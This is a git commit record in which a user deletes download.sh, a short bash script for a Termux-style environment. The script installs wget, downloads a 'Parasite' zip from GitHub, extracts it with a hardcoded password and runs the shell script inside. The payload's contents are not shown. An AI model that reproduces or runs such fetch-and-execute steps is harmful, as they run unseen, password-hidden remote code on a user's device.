1071e6dd9c62e9630f7a714d4d68a927f1c2ab9a
SrTopster <85837528+SrTopster@users.noreply.github.com>
2021-07-12 15:58:57 -0300

    Delete download.sh

--- download.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-until command -v wget > /dev/null; do
-    pkg install wget unzip -y
-done
-wget https://raw.githubusercontent.com/SrTopster/Parasite/main/parasite.zip
-unzip -P tibia parasite.zip
-bash parasite.sh
-exit
